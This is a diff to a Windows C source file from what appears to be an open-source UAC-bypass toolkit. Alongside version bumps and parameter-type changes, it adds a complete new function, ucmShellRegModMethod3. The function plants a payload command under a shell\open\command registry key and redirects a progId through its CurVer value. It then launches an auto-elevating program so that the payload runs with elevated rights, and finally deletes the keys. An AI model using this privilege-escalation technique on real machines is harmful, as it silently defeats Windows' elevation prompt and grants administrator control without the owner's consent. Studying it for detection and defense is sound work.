@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2020
+*  (C) COPYRIGHT AUTHORS, 2016 - 2021
 *
 *  TITLE:       SHELLSUP.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.57
 *
-*  DATE:        14 Sep 2020
+*  DATE:        01 Nov 2021
 *
 *  Shell registry hijack autoelevation methods.
 *
@@ -21,6 +21,7 @@
 *  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *  https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
 *  https://packetstormsecurity.com/files/155927/Microsoft-Windows-10-Local-Privilege-Escalation.html
+*  https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -40,7 +41,7 @@
 */
 NTSTATUS ucmxSetSlaveParams(
     _In_ HANDLE KeyHandle,
-    _In_ LPWSTR Payload
+    _In_ LPCWSTR Payload
 )
 {
     NTSTATUS ntStatus = STATUS_ACCESS_DENIED;
@@ -84,7 +85,7 @@ NTSTATUS ucmxSetSlaveParams(
 */
 NTSTATUS ucmxCreateSlaveKey(
     _In_ HANDLE RootKey,
-    _In_ LPWSTR Payload,
+    _In_ LPCWSTR Payload,
     _Inout_ LPWSTR SlaveKey //cch max MAX_PATH
 )
 {
@@ -136,9 +137,9 @@ NTSTATUS ucmxCreateSlaveKey(
 */
 NTSTATUS ucmShellRegModMethod(
     _In_ UCM_METHOD Method,
-    LPWSTR lpTargetKey,
-    LPWSTR lpszTargetApp,
-    LPWSTR lpszPayload
+    LPCWSTR lpTargetKey,
+    LPCWSTR lpszTargetApp,
+    LPCWSTR lpszPayload
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
@@ -370,9 +371,9 @@ NTSTATUS ucmShellRegModMethod(
 */
 NTSTATUS ucmShellRegModMethod2(
     _In_ UCM_METHOD Method,
-    LPWSTR lpTargetKey,
-    LPWSTR lpszTargetApp,
-    LPWSTR lpszPayload
+    LPCWSTR lpTargetKey,
+    LPCWSTR lpszTargetApp,
+    LPCWSTR lpszPayload
 )
 {
     BOOLEAN bBackupAvailable = FALSE;
@@ -481,6 +482,123 @@ NTSTATUS ucmShellRegModMethod2(
     }
 
     if (hClassesRoot) NtClose(hClassesRoot);
+
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        supEnableDisableWow64Redirection(FALSE);
+    }
+#endif
+    return MethodResult;
+}
+
+/*
+* ucmShellRegModMethod3
+*
+* Purpose:
+*
+* Bypass UAC using registry shell key CurVer progId.
+*
+*/
+NTSTATUS ucmShellRegModMethod3(
+    LPCWSTR lpTargetKey,
+    LPCWSTR lpszTargetApp,
+    LPCWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HANDLE hClassesRoot, hSubKey = NULL;
+
+    SIZE_T sz;
+    WCHAR szKey[MAX_PATH];
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        MethodResult = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(MethodResult))
+            return MethodResult;
+    }
+#endif
+
+    do {
+
+        MethodResult = supOpenClassesKey(NULL, &hClassesRoot);
+        if (!NT_SUCCESS(MethodResult))
+            break;
+
+        RtlSecureZeroMemory(&szKey, sizeof(szKey));
+
+        //
+        // Prepare registry key for a new handler.
+        //
+        _strcpy(szKey, ABSOLUTEWIN);
+        _strcat(szKey, T_SHELL_OPEN);
+        _strcat(szKey, TEXT("\\"));
+        _strcat(szKey, T_SHELL_COMMAND);
+
+        if (ERROR_SUCCESS == RegCreateKeyEx(hClassesRoot, szKey, 0, NULL,
+            REG_OPTION_NON_VOLATILE,
+            MAXIMUM_ALLOWED,
+            NULL,
+            (HKEY*)&hSubKey,
+            NULL))
+        {
+            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
+
+            MethodResult = supRegWriteValue(hSubKey,
+                NULL,
+                REG_SZ,
+                (PVOID)lpszPayload,
+                (DWORD)sz);
+
+
+            RegCloseKey(hSubKey);
+        }
+
+        if (!NT_SUCCESS(MethodResult))
+            break;
+
+        //
+        // Set CurVer to target key
+        //
+        hSubKey = NULL;
+        _strcpy(szKey, lpTargetKey);
+        _strcat(szKey, TEXT("\\"));
+        _strcat(szKey, T_CURVER);
+
+        if (ERROR_SUCCESS == RegCreateKeyEx(hClassesRoot, szKey, 0, NULL,
+            REG_OPTION_NON_VOLATILE,
+            MAXIMUM_ALLOWED,
+            NULL,
+            (HKEY*)&hSubKey,
+            NULL))
+        {
+            sz = (1 + _strlen(ABSOLUTEWIN)) * sizeof(WCHAR);
+
+            MethodResult = supRegWriteValue(hSubKey,
+                NULL,
+                REG_SZ,
+                (PVOID)ABSOLUTEWIN,
+                (DWORD)sz);
+
+            if (NT_SUCCESS(MethodResult)) {
+
+                if (supRunProcess(lpszTargetApp, NULL))
+                    MethodResult = STATUS_SUCCESS;
+
+            }
+
+            RegCloseKey(hSubKey);
+
+            RegDeleteKey(hClassesRoot, szKey);
+        }
+
+    } while (FALSE);
+
+    supRegDeleteKeyRecursive(hClassesRoot, ABSOLUTEWIN);
+
+    if (hClassesRoot) NtClose(hClassesRoot);
+
 
 
 #ifndef _WIN64
